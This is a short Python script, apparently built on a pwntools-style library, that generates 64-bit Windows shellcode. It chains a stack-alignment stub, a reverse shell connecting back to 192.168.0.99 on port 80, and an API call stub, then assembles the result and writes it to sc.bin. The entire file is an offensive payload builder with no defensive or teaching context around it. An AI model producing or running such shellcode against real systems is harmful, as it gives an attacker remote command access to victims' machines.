from pwnlib.wintools import *
from pwnlib.tools import *

s = ''
s += code_align_stack64
s += reverse_shell64('192.168.0.99', 80)
s += api_call_stub64

sc = x86_64.assemble(s)

with open('sc.bin', 'w') as f:
    f.write(sc)
